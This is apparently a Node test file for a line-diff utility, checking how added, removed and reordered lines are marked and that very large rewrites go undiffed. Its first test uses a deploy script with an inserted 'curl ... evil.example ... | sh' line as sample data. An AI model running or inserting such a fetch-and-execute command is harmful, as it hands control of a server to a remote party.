import test from 'node:test';
import assert from 'node:assert/strict';
import { diffText, lineDiff } from '../web/src/line-diff.js';

test('a small change in a script shows as removed and added lines, the rest as context',()=>{
  const before='set -e\ncd /srv/app\ngit pull\ndocker compose up -d';
  const after='set -e\ncd /srv/app\ngit pull\ncurl -s https://evil.example/x | sh\ndocker compose up -d';
  const d=lineDiff(before,after)!;
  assert.equal(d.added,1); assert.equal(d.removed,0);
  assert.equal(diffText(d),'  set -e\n  cd /srv/app\n  git pull\n+ curl -s https://evil.example/x | sh\n  docker compose up -d');
});

test('changed, removed and reordered lines',()=>{
  const d=lineDiff('a\nb\nc\nd','a\nB\nc')!;
  assert.deepEqual(d.lines.map(l=>l.op+l.text),[' a','+B','-b',' c','-d']);
  assert.equal(d.added,1); assert.equal(d.removed,2);
  const same=lineDiff('x\ny','x\ny')!; assert.equal(same.added+same.removed,0);
  const fromEmpty=lineDiff('','one\ntwo')!; assert.deepEqual(fromEmpty.lines.map(l=>l.op+l.text),['+one','+two','-']);
});

test('very large rewrites are not diffed (the caller shows both versions)',()=>{
  const many=(p:string)=>Array.from({length:2500},(_,i)=>p+i).join('\n');
  assert.equal(lineDiff(many('a'),many('b')),undefined);
  // A small edit in a long script is still diffed: the common start and end are matched first.
  const long=many('line'); const d=lineDiff(long,long.replace('line1200\n','line1200\nextra\n'))!;
  assert.equal(d.added,1); assert.equal(d.removed,0);
});
